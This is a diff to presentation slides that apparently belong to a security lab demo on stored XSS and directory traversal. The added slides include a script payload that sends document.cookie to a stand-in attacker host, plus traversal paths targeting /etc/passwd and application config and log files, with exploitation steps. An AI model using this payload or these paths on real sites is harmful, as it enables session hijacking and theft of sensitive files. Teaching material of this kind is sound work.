@@ -12,35 +12,35 @@ layout: section
 layout: default
 ---
 
-# Stored XSS Attack in Blog
+# Stored XSS Attack
 
 <div class="grid grid-cols-2 gap-8">
   <div>
-    <h3 class="text-xl mb-4">Attack Scenario</h3>
-    <div class="space-y-4">
-      <p>1. Normal blog functionality</p>
-      <p>2. Advanced XSS payload injection</p>
-      <p>3. Cookie theft simulation</p>
-    </div>
+    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Advanced Payload</h3>
+
+```js
+<script>
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET', '<http://attacker.com/?cookie=>' 
+            + document.cookie);
+  xhr.send();
+
+  document.body.style.backgroundColor = 'red';
+  alert('XSS Démonstration');
+</script>
+```
   </div>
-  <div class="flex flex-col justify-center">
-    <h3 class="text-xl mb-4">Security Impact</h3>
+
+  <div>
+    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Attack Process</h3>
     <div class="space-y-4">
-      <p>• Persistent malicious code</p>
-      <p>• Session hijacking risks</p>
-      <p>• Data confidentiality breach</p>
+      <p>1. Navigate to "Stored XSS Blog"</p>
+      <p>2. Post a normal message first</p>
+      <p>3. Submit XSS payload</p>
+      <p>4. Observe execution on each visit</p>
     </div>
   </div>
 </div>
-
-<!-- Emplacement pour le GIF de démonstration -->
-<!-- <div class="mt-8">
-  <img 
-    src="/demos/stored-xss.gif" 
-    class="rounded-lg shadow-lg w-full"
-    alt="Stored XSS Attack demonstration"
-  />
-</div> -->
 
 <div class="slide-number">
   <SlideCurrentNo />/<SlideTotalNo />
@@ -50,63 +50,66 @@ layout: default
 layout: default
 ---
 
-# Directory Traversal Exploitation
+# Directory Traversal
 
 <div class="grid grid-cols-2 gap-8">
   <div>
-    <h3 class="text-xl mb-4">Attack Methodology</h3>
-    <div class="space-y-4">
-      <p>1. Path manipulation techniques</p>
-      <p>2. Filter bypass methods</p>
-      <p>3. Sensitive file access</p>
-    </div>
+    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Target Files</h3>
+
+```bash
+# System Files
+../../../etc/passwd
+../../../etc/hosts
+../../../etc/hostname
+
+# Application Files
+../../../var/www/html/config.php
+../../../var/log/apache2/access.log
+../../../etc/apache2/apache2.conf
+```
+
   </div>
-  <div class="flex flex-col justify-center">
-    <h3 class="text-xl mb-4">Critical Findings</h3>
+
+  <div>
+    <h3 class="uppercase text-gray-400 tracking-wider mb-4">Exploitation Steps</h3>
     <div class="space-y-4">
-      <p>• System file exposure</p>
-      <p>• Configuration leakage</p>
-      <p>• Security boundary bypass</p>
+      <p>1. Access "Directory Traversal - Files"</p>
+      <p>2. Test normal file access</p>
+      <p>3. Use path traversal sequences</p>
+      <p>4. Access sensitive files</p>
     </div>
   </div>
 </div>
-
-<!-- Emplacement pour le GIF de démonstration -->
-<!-- <div class="mt-8">
-  <img 
-    src="/demos/directory-traversal.gif" 
-    class="rounded-lg shadow-lg w-full"
-    alt="Directory Traversal demonstration"
-  />
-</div> -->
 
 <div class="slide-number">
   <SlideCurrentNo />/<SlideTotalNo />
 </div>
 
+
 ---
 layout: default
 ---
 
-# Technical Impact Analysis
+# Security Impact
 
 <div class="grid grid-cols-2 gap-8">
   <div class="bg-red-50/20 p-6 rounded-lg">
-    <h3 class="text-xl mb-4">Stored XSS</h3>
-    <div class="space-y-4">
-      <p>• Affects all visitors</p>
-      <p>• Persists in database</p>
-      <p>• Cross-user impact</p>
-      <p>• Session compromise</p>
+    <h3 class="font-bold mb-4">XSS Impact</h3>
+    <div class="space-y-2">
+      <p>• Session hijacking</p>
+      <p>• Data theft</p>
+      <p>• Page defacement</p>
+      <p>• Malicious redirects</p>
     </div>
   </div>
+
   <div class="bg-blue-50/20 p-6 rounded-lg">
-    <h3 class="text-xl mb-4">Directory Traversal</h3>
-    <div class="space-y-4">
-      <p>• File system access</p>
-      <p>• Information disclosure</p>
+    <h3 class="font-bold mb-4">Directory Traversal Impact</h3>
+    <div class="space-y-2">
       <p>• Configuration exposure</p>
-      <p>• Privacy violation</p>
+      <p>• System information leak</p>
+      <p>• Sensitive data access</p>
+      <p>• Log file disclosure</p>
     </div>
   </div>
 </div>
